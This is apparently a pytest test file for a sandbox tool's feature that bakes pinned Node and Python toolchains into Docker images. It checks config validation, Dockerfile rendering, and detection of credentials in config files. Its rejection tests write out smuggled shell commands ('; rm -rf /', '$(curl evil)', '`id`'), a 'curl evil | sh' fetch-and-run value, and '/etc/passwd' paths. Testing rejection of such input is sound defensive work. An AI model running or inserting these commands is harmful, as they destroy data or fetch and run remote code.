"""`toolchains`: version-pinned runtimes + lockfile-strict installs baked into
the derived harness image. Off by default — absent, nothing renders differently."""

from __future__ import annotations

import json
from pathlib import Path

import pytest
import yaml
from helpers import CHROMIUM, NODE, make_cfg, make_session

from glove import sessiondir as sdm
from glove import toolchains as tcs
from glove.config import ConfigError, _coerce
from glove.enforcers.nono.policies import GLOVE_READ
from glove.harnessconfig import build_environment_context, render_home
from glove.image import content_hash, stage_context
from glove.plan import build_session_plan
from glove.runtimes.docker import DockerRuntime

PY = {"lang": "python", "version": "3.12"}
# The runtime bind-mount roots a baked install must never sit under.
MOUNT_ROOTS = ("/work", "/home/agent", "/mnt", "/etc/glove/enforcer")


def _cfg(tmp_path, **kw):
    work = tmp_path / "work"
    work.mkdir(exist_ok=True)
    kw.setdefault("harness", "pi")
    return make_cfg(workdir=str(work), name="s", **kw)


def _plan(tmp_path, **kw):
    return build_session_plan(_cfg(tmp_path, **kw), home_dir=str(tmp_path / "h"),
                              state_dir=str(tmp_path / "ext"), session_dir=str(tmp_path))


def _harness(plan, tmp_path) -> dict:
    doc = yaml.safe_load(DockerRuntime().render(plan, Path(tmp_path)).compose_yaml)
    return doc["services"]["glove-s-harness"]


def _node_project(root: Path, lock: str | None = "package-lock.json", deps: dict | None = None) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    (root / "package.json").write_text(json.dumps({"name": "app", "devDependencies": deps or {}}))
    if lock:
        (root / lock).write_text("{}")
    return root


def _py_project(root: Path) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    (root / "pyproject.toml").write_text("[project]\nname = 'app'\nversion = '0'\n")
    (root / "uv.lock").write_text("version = 1\n")
    return root


# --- config + session file -----------------------------------------------------------


def test_config_key_defaults_empty_and_round_trips():
    assert _coerce({}).toolchains == []
    assert _coerce({"toolchains": None}).toolchains == []
    cfg = _coerce({"toolchains": [NODE, PY]})
    assert _coerce(yaml.safe_load(cfg.to_yaml())).toolchains == [NODE, PY]
    with pytest.raises(ConfigError, match="must be a list"):
        _coerce({"toolchains": {"lang": "node"}})
    with pytest.raises(ConfigError, match="unknown config keys"):
        _coerce({"toolchains": [], "toolchain": []})


def test_session_file_accepts_the_key_and_still_refuses_bogus_ones(tmp_path):
    d = make_session(tmp_path / "a", "toolchains:\n  - {lang: node, version: \"22.11.0\"}\n")
    sd = sdm.SessionDir(d)
    assert sdm.to_config(sd, sdm.load_file(sd), "a-000000").toolchains == [NODE]
    d = make_session(tmp_path / "b", "toolchains: []\nlanguages: []\n")
    with pytest.raises(sdm.SessionError, match="unknown key"):
        sdm.load_file(sdm.SessionDir(d))


@pytest.mark.parametrize(("block", "match"), [
    ({"version": "1.0.0"}, "`lang` must be one of"),
    ({"lang": "ruby", "version": "3.3.0"}, "`lang` must be one of"),
    ({"lang": "node"}, "`version` is required"),
    ({"lang": "node", "version": ""}, "`version` is required"),
    ({"lang": "node", "version": "22"}, "exact X.Y.Z"),
    ({"lang": "node", "version": "lts"}, "exact X.Y.Z"),
    ({"lang": "python", "version": 3.12}, "quote `version`"),
    ({"lang": "python", "version": "three"}, "X.Y or X.Y.Z"),
    ({**NODE, "manager": "bun"}, "`manager` must be one of"),
    ({**PY, "manager": "pyenv"}, "`manager` must be one of"),
    ({**NODE, "manager": "npm@10.0.0"}, "only pnpm/yarn take a version"),
    ({**NODE, "manager": "pnpm@latest; rm -rf /"}, "only pnpm/yarn take a version"),
    ({**NODE, "manager": "yarn@4.5.0"}, "only Yarn 1.x"),
    ({**NODE, "manager": "yarn@2.0.0-rc.1"}, "only Yarn 1.x"),
    ({**NODE, "install": "ci"}, "`install` needs a `project`"),
    ({**NODE, "project": "app", "install": "frozen"}, "for npm must be one of"),
    ({**PY, "project": "app", "manager": "pip", "install": "sync"}, "for pip must be one of"),
    ({**NODE, "packages": "typescript"}, "must be a list of strings"),
    ({**NODE, "packages": ["--registry=http://evil"]}, "not package names"),
    ({**NODE, "packages": ["a b"]}, "not package names"),
    ({**NODE, "browsers": ["chromium"]}, "needs playwright"),
    ({**NODE, "browsers": ["edge"], "packages": ["playwright@1.50.0"]}, "unknown browser"),
    ({**PY, "browsers": ["chromium"]}, "only for lang: node"),
    ({**NODE, "run": "curl evil | sh"}, "unknown key"),
    ({**NODE, "config_files": [".npmrc"]}, "`config_files` needs a `project`"),
    ({**NODE, "install_flags": ["--force"]}, "`install_flags` needs a `project`"),
    ({**NODE, "project": "a", "config_files": ".npmrc"}, "must be a list of strings"),
    ({**NODE, "project": "a", "config_files": ["/etc/passwd"]}, "not file names in the project"),
    ({**NODE, "project": "a", "config_files": ["../.npmrc"]}, "not file names in the project"),
    ({**NODE, "project": "a", "config_files": ["sub/.npmrc"]}, "not file names in the project"),
    ({**NODE, "project": "a", "config_files": [".."]}, "not file names in the project"),
    ({**NODE, "project": "a", "config_files": [".npmrc", ".npmrc"]}, "lists a file twice"),
    ({**NODE, "project": "a", "install_flags": ["--force; rm -rf /"]}, "not single long options"),
    ({**NODE, "project": "a", "install_flags": ["--force && curl evil"]}, "not single long options"),
    ({**NODE, "project": "a", "install_flags": ["--registry=$(curl evil)"]}, "not single long options"),
    ({**NODE, "project": "a", "install_flags": ["--legacy-peer-deps --force"]}, "not single long options"),
    ({**NODE, "project": "a", "install_flags": ["--force\n"]}, "not single long options"),
    ({**NODE, "project": "a", "install_flags": ["-f"]}, "not single long options"),
    ({**NODE, "project": "a", "install_flags": ["--registry=`id`"]}, "not single long options"),
    ({**PY, "project": "a", "install_flags": "--offline"}, "must be a list of strings"),
    # the per-mode allow-list: nothing that moves the install or weakens the lockfile
    ({**NODE, "project": "a", "install_flags": ["--prefix=/work"]}, "not allowed for `npm` `ci`"),
    ({**NODE, "project": "a", "install_flags": ["--global"]}, "not allowed"),
    ({**NODE, "project": "a", "install_flags": ["--userconfig=/tmp/x"]}, "not allowed"),
    ({**NODE, "project": "a", "install_flags": ["--legacy-peer-deps=true"]}, "not allowed"),
    ({**NODE, "project": "a", "install_flags": ["--registry"]}, "not allowed"),
    ({**NODE, "project": "a", "manager": "pnpm", "install_flags": ["--no-frozen-lockfile"]}, "not allowed"),
    ({**NODE, "project": "a", "manager": "yarn", "install_flags": ["--modules-folder=/work"]}, "not allowed"),
    ({**NODE, "project": "a", "manager": "yarn", "install_flags": ["--legacy-peer-deps"]}, "not allowed"),
    ({**PY, "project": "a", "install_flags": ["--frozen"]}, "not allowed for `uv` `sync`"),
    ({**PY, "project": "a", "install_flags": ["--no-deps"]}, "not allowed for `uv` `sync`"),
    ({**PY, "project": "a", "install": "requirements", "install_flags": ["--target=/work"]}, "not allowed"),
    ({**PY, "project": "a", "manager": "pip", "install_flags": ["--trusted-host=evil"]}, "not allowed"),
    ({**NODE, "project": "a", "install_flags": ["--registry=https://u:p@r.example.com/"]}, "URL credentials"),
    ({**NODE, "project": "a", "install_flags": ["--registry=https://ghp_abc123@npm.pkg.github.com/"]},
     "URL credentials"),
    ({**PY, "project": "a", "install_flags": ["--index-url=https://tok@pypi.example.com/simple"]},
     "URL credentials"),
    ("node", "must be a mapping"),
])
def test_bad_blocks_are_refused(block, match):
    with pytest.raises(ConfigError, match=match):
        tcs.parse([block])


def test_one_block_per_lang():
    with pytest.raises(ConfigError, match="second `lang: node`"):
        tcs.parse([NODE, PY, {**NODE, "version": "20.18.0"}])


def test_defaults_are_lockfile_strict():
    node, py = tcs.parse([{**NODE, "project": "a"}, {**PY, "project": "b"}])
    assert (node.manager, node.install) == ("npm", "ci")
    assert (py.manager, py.install) == ("uv", "sync")
    (pnpm,) = tcs.parse([{**NODE, "manager": "pnpm@9.15.0", "project": "a"}])
    assert (pnpm.manager, pnpm.manager_version, pnpm.install) == ("pnpm", "9.15.0", "frozen")
    (bare,) = tcs.parse([NODE])
    assert bare.install is None and bare.project_spec is None


# --- plan ---------------------------------------------------------------------------------


def test_unset_leaves_plan_and_render_untouched(tmp_path):
    plan = _plan(tmp_path)
    assert plan.toolchains == []
    assert plan.derived_dockerfile is None and plan.image == plan.profile.image
    harness = _harness(plan, tmp_path)
    assert not {"VIRTUAL_ENV", "PLAYWRIGHT_BROWSERS_PATH", "PATH"} & set(harness["environment"])
    assert tcs.ROOT not in json.dumps(harness)


def test_node_block_renders_pinned_runtime_and_strict_install(tmp_path):
    _node_project(tmp_path / "app")
    plan = _plan(tmp_path, toolchains=[{**NODE, "project": "app"}])
    df = plan.derived_dockerfile
    assert "https://nodejs.org/dist/v22.11.0/$f" in df and "SHASUMS256.txt" in df and "sha256sum -c -" in df
    # only the manifest + lockfile are baked, never the project's tree
    assert ('COPY ["toolchain-node/package.json", "toolchain-node/package-lock.json", '
            '"/opt/glove/toolchains/node/project/"]') in df
    assert "npm ci --no-audit" in df
    assert ("ENV PATH=/opt/glove/toolchains/node/22.11.0/bin:"
            "/opt/glove/toolchains/node/project/node_modules/.bin:$PATH") in df
    # deps resolve via the pinned node's global folder, not NODE_PATH (nono strips it)
    assert ("ln -s /opt/glove/toolchains/node/project/node_modules /opt/glove/toolchains/node/22.11.0/lib/node"
            in df)
    assert "NODE_PATH" not in plan.environment
    assert "PLAYWRIGHT_BROWSERS_PATH" not in plan.environment
    assert [tc.project for tc in plan.toolchains] == [(tmp_path / "app").resolve()]
    # Pi always runs on the image's own node (the pinned one is first on PATH)
    assert plan.profile.entry[:2] == ["/usr/local/bin/node", "/usr/local/bin/pi"]
    assert _harness(plan, tmp_path)["image"] == plan.image


def test_node_managers_and_browsers(tmp_path):
    _node_project(tmp_path / "app", "pnpm-lock.yaml", deps={"@playwright/test": "1.50.0"})
    plan = _plan(tmp_path, toolchains=[{**NODE, "manager": "pnpm@9.15.0", "project": "app",
                                        "packages": ["typescript@5.6.3"], "browsers": ["chromium"]}])
    df = plan.derived_dockerfile
    # the manager and global packages in one step
    assert "npm install -g --no-audit --no-fund --cache /tmp/npm-cache pnpm@9.15.0 typescript@5.6.3" in df
    assert "pnpm install --frozen-lockfile" in df
    assert ("PLAYWRIGHT_BROWSERS_PATH=/opt/glove/toolchains/node/browsers "
            "/opt/glove/toolchains/node/project/node_modules/.bin/playwright install --with-deps chromium") in df
    assert plan.environment["PLAYWRIGHT_BROWSERS_PATH"] == "/opt/glove/toolchains/node/browsers"
    # browsers via a global playwright, no project
    plan = _plan(tmp_path, toolchains=[{**NODE, "packages": ["playwright@1.50.0"], "browsers": ["firefox"]}])
    assert " playwright install --with-deps firefox" in plan.derived_dockerfile
    # with no project, the global packages are what `require` finds from any directory
    assert "ln -s /opt/glove/toolchains/node/22.11.0/lib/node_modules /opt/glove/toolchains/node/22.11.0/lib/node" \
        in plan.derived_dockerfile
    # a project without playwright: the global one from `packages` installs the browsers
    _node_project(tmp_path / "plain")
    plan = _plan(tmp_path, toolchains=[{**NODE, "project": "plain", "packages": ["playwright@1.50.0"],
                                        "browsers": ["chromium"]}])
    df = plan.derived_dockerfile
    assert "browsers playwright install --with-deps chromium" in df
    assert "node_modules/.bin/playwright" not in df


def test_python_block_renders_uv_sync_into_a_venv(tmp_path):
    _py_project(tmp_path / "tool")
    plan = _plan(tmp_path, harness="vibe", toolchains=[{**PY, "project": "tool", "packages": ["rich==13.9.4"]}])
    df = plan.derived_dockerfile
    assert f"releases/download/{tcs.UV_VERSION}/$f" in df
    assert all(sha in df for sha in tcs.UV_SHA256.values())
    assert "python install --no-bin 3.12" in df
    assert "uv sync --locked --no-install-project --python 3.12" in df
    assert "UV_PROJECT_ENVIRONMENT=/opt/glove/toolchains/python/venv" in df
    # seeded even for sync, so `pip` on PATH is the venv's
    assert "uv venv --seed --python 3.12 /opt/glove/toolchains/python/venv" in df
    assert "pip install --python /opt/glove/toolchains/python/venv/bin/python rich==13.9.4" in df
    assert "ENV PATH=/opt/glove/toolchains/python/venv/bin:$PATH" in df
    assert plan.environment["VIRTUAL_ENV"] == "/opt/glove/toolchains/python/venv"


def test_python_pip_requirements(tmp_path):
    (tmp_path / "tool").mkdir()
    (tmp_path / "tool" / "requirements.txt").write_text("rich==13.9.4\n")
    plan = _plan(tmp_path, toolchains=[{**PY, "manager": "pip", "project": "tool"}])
    df = plan.derived_dockerfile
    assert "uv venv --seed --python 3.12 /opt/glove/toolchains/python/venv" in df
    assert "/opt/glove/toolchains/python/venv/bin/python -m pip install --no-cache-dir -r requirements.txt" in df


def test_block_order_is_install_and_path_order(tmp_path):
    plan = _plan(tmp_path, toolchains=[PY, NODE])
    df = plan.derived_dockerfile
    assert df.index("# toolchain: python") < df.index("# toolchain: node")
    assert ("ENV PATH=/opt/glove/toolchains/python/venv/bin:/opt/glove/toolchains/node/22.11.0/bin:$PATH") in df


def test_layers_are_phased_across_blocks_and_never_chmod_everything(tmp_path):
    _node_project(tmp_path / "app")
    _py_project(tmp_path / "tool")
    df = _plan(tmp_path, toolchains=[{**NODE, "project": "app", "packages": ["tsx@4.19.2"]},
                                     {**PY, "project": "tool"}]).derived_dockerfile
    # every runtime, then global tools, then project installs: a lockfile bump rebuilds no runtime
    runtimes = max(df.index("nodejs.org/dist"), df.index("venv --seed"))
    assert runtimes < df.index("npm install -g") < df.index("npm ci") < df.index("uv sync")
    assert "chmod -R" not in df and "-exec chmod a+rX {} +" in df


def _linked_lock(root: Path, target_exists: bool) -> None:
    if target_exists:
        (root / "elsewhere.json").write_text("{}")
    (_node_project(root / "app", lock=None) / "package-lock.json").symlink_to(root / "elsewhere.json")


@pytest.mark.parametrize(("setup", "block", "match"), [
    (lambda r: None, {**NODE, "project": "missing"}, "does not exist"),
    (lambda r: (r / "file").write_text("x"), {**NODE, "project": "file"}, "is not a directory"),
    (lambda r: None, {**NODE, "project": "."}, "would bake"),
    (lambda r: (r / ".glove").mkdir(), {**NODE, "project": ".glove"}, "would bake"),
    (lambda r: (r / "local").mkdir(), {**NODE, "project": "local"}, "would bake"),
    (lambda r: _node_project(r / "app", lock=None), {**NODE, "project": "app"}, "needs package-lock.json"),
    (lambda r: _node_project(r / "app"), {**NODE, "manager": "yarn", "project": "app"}, "needs yarn.lock"),
    (lambda r: (r / "py").mkdir(), {**PY, "project": "py"}, "needs pyproject.toml"),
    (lambda r: (r / "py").mkdir() or (r / "py" / "pyproject.toml").write_text(""), {**PY, "project": "py"},
     "needs uv.lock"),
    (lambda r: _node_project(r / "app"), {**NODE, "project": "app", "browsers": ["chromium"]}, "needs playwright"),
    (lambda r: _linked_lock(r, target_exists=False), {**NODE, "project": "app"}, "needs package-lock.json"),
    (lambda r: _linked_lock(r, target_exists=True), {**NODE, "project": "app"}, "is a symlink"),
])
def test_project_validation(tmp_path, setup, block, match):
    (tmp_path / "work").mkdir(exist_ok=True)
    setup(tmp_path)
    with pytest.raises(ConfigError, match=match):
        _plan(tmp_path, toolchains=[block])


def test_session_file_is_never_a_project(tmp_path):
    (tmp_path / "glove-session.yml").write_text("glove: 3\n")
    with pytest.raises(ConfigError, match="is not a directory"):
        _plan(tmp_path, toolchains=[{**NODE, "project": "glove-session.yml"}])


# --- config_files + install_flags -------------------------------------------------------------


NPMRC = "registry = https://registry.example.com/npm/\nlink-workspace-packages = true\nlegacy-peer-deps = true\n"


def test_config_files_are_baked_beside_the_manifest_before_the_install(tmp_path):
    app = _node_project(tmp_path / "app")
    (app / ".npmrc").write_text(NPMRC)
    plan = _plan(tmp_path, toolchains=[{**NODE, "project": "app", "config_files": [".npmrc"]}])
    df = plan.derived_dockerfile
    copy = ('COPY ["toolchain-node/package.json", "toolchain-node/package-lock.json", '
            '"toolchain-node/.npmrc", "/opt/glove/toolchains/node/project/"]')
    assert copy in df and df.index(copy) < df.index("npm ci")
    assert (app / ".npmrc").resolve() in plan.toolchains[0].project_files
    dest = tmp_path / "ctx"
    stage_context(dest, [("toolchain-node", f) for f in plan.toolchains[0].project_files])
    assert (dest / "toolchain-node" / ".npmrc").read_text() == NPMRC


def test_install_flags_are_appended_to_every_managers_install(tmp_path):
    _node_project(tmp_path / "app")
    df = _plan(tmp_path, toolchains=[{**NODE, "project": "app", "install_flags": [
        "--legacy-peer-deps", "--registry=https://registry.example.com/npm/"]}]).derived_dockerfile
    assert ("npm ci --no-audit --no-fund --cache /tmp/npm-cache --legacy-peer-deps "
            "--registry=https://registry.example.com/npm/ \\\n") in df
    # only the project install: never the global tools step
    assert df.count("--legacy-peer-deps") == 1
    _node_project(tmp_path / "pn", "pnpm-lock.yaml")
    df = _plan(tmp_path, toolchains=[{**NODE, "manager": "pnpm", "project": "pn",
                                      "install_flags": ["--prefer-offline"]}]).derived_dockerfile
    assert "pnpm install --frozen-lockfile --store-dir /tmp/pnpm-store --prefer-offline \\\n" in df
    _py_project(tmp_path / "tool")
    df = _plan(tmp_path, toolchains=[{**PY, "project": "tool", "install_flags": ["--no-dev"]}]).derived_dockerfile
    assert "uv sync --locked --no-install-project --python 3.12 --no-dev \\\n" in df
    (tmp_path / "req").mkdir()
    (tmp_path / "req" / "requirements.txt").write_text("rich\n")
    df = _plan(tmp_path, toolchains=[{**PY, "manager": "pip", "project": "req",
                                      "install_flags": ["--no-deps"]}]).derived_dockerfile
    assert "-m pip install --no-cache-dir -r requirements.txt --no-deps \\\n" in df


@pytest.mark.parametrize(("setup", "config_files", "match"), [
    (lambda app: None, [".npmrc"], "is not a file"),
    (lambda app: (app / ".npmrc").mkdir(), [".npmrc"], "is not a file"),
    (lambda app: None, ["package-lock.json"], "already baked"),
    (lambda app: ((app.parent / "elsewhere").write_text(NPMRC), (app / ".npmrc").symlink_to(app.parent / "elsewhere")),
     [".npmrc"], "is a symlink"),
    (lambda app: (app / ".npmrc").write_text("//registry.example.com/:_authToken=abc123\n"), [".npmrc"],
     r"carries a credential \(line 1\)"),
    (lambda app: (app / ".npmrc").write_text("registry=https://x/\n_auth=dXNlcjpwYXNz\n"), [".npmrc"],
     r"credential \(line 2\)"),
    (lambda app: (app / ".npmrc").write_text("_password=c2VjcmV0\n"), [".npmrc"], "credential"),
    (lambda app: (app / ".npmrc").write_text("//r/:_authToken=${NPM_TOKEN}\n"), [".npmrc"], "credential"),
    (lambda app: (app / ".yarnrc.yml").write_text('npmAuthToken: "abc"\n'), [".yarnrc.yml"], "credential"),
    (lambda app: (app / "pip.conf").write_text("[global]\nindex-url = https://u:p@pypi.example.com/simple\n"),
     ["pip.conf"], "credential"),
    # yarn v1 writes `key "value"`: the `:` inside the registry URL is part of the key
    (lambda app: (app / ".yarnrc").write_text('"//registry.npmjs.org/:_authToken" "npm_abc123"\n'),
     [".yarnrc"], r"credential \(line 1\)"),
    (lambda app: (app / ".yarnrc").write_text("registry \"https://r.example.com/\"\n_authToken npm_abc\n"),
     [".yarnrc"], r"credential \(line 2\)"),
    (lambda app: (app / ".npmrc").write_text("//r.example.com/:_password = c2VjcmV0\n"), [".npmrc"], "credential"),
    # a token as the bare URL username
    (lambda app: (app / ".npmrc").write_text("registry=https://ghp_abc123@npm.pkg.github.com/\n"),
     [".npmrc"], "credential"),
    (lambda app: (app / "uv.toml").write_text('[[index]]\nurl = "https://tok@pypi.example.com/simple"\n'),
     ["uv.toml"], "credential"),
])
def test_config_file_validation(tmp_path, setup, config_files, match):
    setup(_node_project(tmp_path / "app"))
    with pytest.raises(ConfigError, match=match):
        _plan(tmp_path, toolchains=[{**NODE, "project": "app", "config_files": config_files}])


def test_config_file_credential_check_ignores_comments_and_values(tmp_path):
    app = _node_project(tmp_path / "app")
    (app / ".npmrc").write_text("# _authToken goes in ~/.npmrc, never here\n; password too\n"
                                "registry=https://tokens.example.com:8443/npm/\nalways-auth=false\n"
                                "git-tag-version = false\nscope-registry ssh://git@github.com/org/repo\n"
                                'yarn-path "/opt/token-free/yarn.js"\n')
    plan = _plan(tmp_path, toolchains=[{**NODE, "project": "app", "config_files": [".npmrc"]}])
    assert "toolchain-node/.npmrc" in plan.derived_dockerfile


def test_content_hash_tracks_config_files_and_install_flags(tmp_path):
    app = _node_project(tmp_path / "app")
    (app / ".npmrc").write_text(NPMRC)

    def tag(**kw):
        blocks = tcs.resolve([{**NODE, "project": "app", **kw}], tmp_path)
        lines, staged = tcs.dockerfile_lines(blocks)
        return content_hash("\n".join(lines), staged)

    base = tag()
    with_npmrc = tag(config_files=[".npmrc"])
    assert with_npmrc != base
    (app / ".npmrc").write_text(NPMRC.replace("legacy-peer-deps = true\n", ""))
    assert tag(config_files=[".npmrc"]) != with_npmrc
    assert tag() == base  # an unlisted .npmrc is never baked or hashed
    flagged = tag(install_flags=["--legacy-peer-deps"])
    assert flagged != base
    assert tag(install_flags=["--force"]) != flagged


def test_unset_config_files_and_install_flags_render_identically(tmp_path):
    _node_project(tmp_path / "app")
    plain = _plan(tmp_path, toolchains=[{**NODE, "project": "app"}])
    empty = _plan(tmp_path, toolchains=[{**NODE, "project": "app", "config_files": [], "install_flags": None}])
    assert plain.derived_dockerfile == empty.derived_dockerfile and plain.image == empty.image


def test_non_strict_install_mode_needs_only_the_manifest(tmp_path):
    _node_project(tmp_path / "app", lock=None)
    plan = _plan(tmp_path, toolchains=[{**NODE, "project": "app", "install": "install"}])
    assert "npm install --no-audit" in plan.derived_dockerfile


def test_explicit_env_wins(tmp_path):
    _py_project(tmp_path / "tool")
    plan = _plan(tmp_path, toolchains=[{**PY, "project": "tool"}], env={"VIRTUAL_ENV": "/mine"})
    assert plan.environment["VIRTUAL_ENV"] == "/mine"


# --- render invariants ------------------------------------------------------------------------


def _every_block(tmp_path) -> list[tcs.Toolchain]:
    _node_project(tmp_path / "app", deps={"playwright": "1.50.0"})
    _py_project(tmp_path / "tool")
    return tcs.resolve([{**NODE, "manager": "yarn@1.22.22", "install": "install", "project": "app",
                         "packages": ["tsx@4.19.2"], "browsers": ["chromium", "webkit"]},
                        {**PY, "project": "tool", "packages": ["rich"]}], tmp_path)


def test_every_install_prefix_is_outside_the_mounts(tmp_path):
    blocks = _every_block(tmp_path)
    lines, _ = tcs.dockerfile_lines(blocks)
    paths = [*tcs.path_entries(blocks), *tcs.harness_env(blocks).values()]
    paths += [p for line in lines for p in line.replace('"', " ").split() if p.startswith("/opt/")]
    assert paths
    for p in paths:
        assert p.startswith(tcs.ROOT + "/"), p
        assert not any(p == m or p.startswith(m + "/") for m in MOUNT_ROOTS), p
    # readable by every enforcer without a policy change
    assert any(tcs.ROOT.startswith(g + "/") for g in GLOVE_READ)


def test_no_install_runs_at_run_time(tmp_path):
    blocks = _every_block(tmp_path)
    lines, _ = tcs.dockerfile_lines(blocks)
    # every install is a build step; the runtime side is env only
    for line in lines:
        assert line.startswith(("RUN ", "COPY ", "ENV PATH=", "# ")), line
    runtime = json.dumps([tcs.harness_env(blocks), tcs.path_entries(blocks)])
    assert not any(w in runtime for w in ("install", "curl", "sync"))


def test_content_hash_tracks_version_and_manifests_only(tmp_path):
    app = _node_project(tmp_path / "app")

    def tag(version="22.11.0"):
        blocks = tcs.resolve([{**NODE, "version": version, "project": "app"}], tmp_path)
        lines, staged = tcs.dockerfile_lines(blocks)
        return content_hash("\n".join(lines), staged)

    base = tag()
    assert tag("22.12.0") != base
    (app / "node_modules" / "x").mkdir(parents=True)
    (app / "node_modules" / "x" / "index.js").write_text("darwin build")
    (app / ".venv").mkdir()
    (app / ".venv" / "pyvenv.cfg").write_text("home = /opt/homebrew")
    (app / "index.js").write_text("console.log(1)")  # source edits never rebuild the installs
    assert tag() == base
    (app / "package-lock.json").write_text('{"lockfileVersion": 3}')
    assert tag() != base


def test_staging_skips_host_artifacts_and_keeps_symlinks_as_links(tmp_path):
    app = _node_project(tmp_path / "app")
    (app / "node_modules").mkdir()
    (app / "node_modules" / "native.node").write_text("macho")
    secret = tmp_path / "secret.txt"
    secret.write_text("do not bake")
    (app / "leak").symlink_to(secret)
    dest = tmp_path / "ctx"
    stage_context(dest, [("toolchain-node", app)])
    staged = dest / "toolchain-node" / "app"
    assert (staged / "package.json").is_file()
    assert not (staged / "node_modules").exists()
    assert (staged / "leak").is_symlink() and Path((staged / "leak").readlink()) == secret


# --- what the agent is told ------------------------------------------------------------------------


def test_context_file_section_only_when_set(tmp_path):
    cfg = _cfg(tmp_path)
    assert "Toolchains" not in build_environment_context(cfg)
    cfg = _cfg(tmp_path, toolchains=[{**NODE, "project": "app"}, PY])
    text = build_environment_context(cfg)
    assert "## Toolchains" in text and "Node 22.11.0" in text and "Python 3.12" in text
    assert "ln -s /opt/glove/toolchains/node/project/node_modules node_modules" in text
    assert "cannot start inside a shell command" not in text


@pytest.mark.parametrize(("enforcer", "options", "warned"), [
    ("nono+srt", {}, True), ("nono", {}, True), ("srt", {}, False),
    ("nono+srt", {"nono": {"browsers": True}}, False), ("nono", {"nono": {"browsers": True}}, False),
])
def test_browsers_brief_is_honest_about_the_tool_sandbox(tmp_path, enforcer, options, warned):
    cfg = _cfg(tmp_path, enforcer=enforcer, enforcer_options=options,
               toolchains=[CHROMIUM])
    text = build_environment_context(cfg)
    assert "PLAYWRIGHT_BROWSERS_PATH" in text
    assert ("cannot start inside a shell command" in text) is warned


@pytest.mark.parametrize("toolchains", [[], [PY]])
def test_vibe_hook_always_runs_on_the_image_python(tmp_path, toolchains):
    plan = _plan(tmp_path, harness="vibe", toolchains=toolchains)
    cfg = _cfg(tmp_path, harness="vibe", toolchains=toolchains)
    render_home(cfg, plan.profile, tmp_path / "home", plan.model, mount_plan=plan.mount_plan,
                comp=plan.composition, toolchains=plan.toolchains)
    hooks = (tmp_path / "home" / ".vibe" / "hooks.toml").read_text()
    assert 'command = "/usr/local/bin/python3 /opt/glove/vibe-hook"' in hooks


def test_context_file_uses_the_plans_resolved_toolchains(tmp_path):
    cfg = _cfg(tmp_path, toolchains=[{**NODE, "project": "app"}])  # unresolvable: never re-read from cfg
    text = build_environment_context(cfg, toolchains=tcs.parse([PY]))
    assert "Python 3.12" in text and "Node" not in text
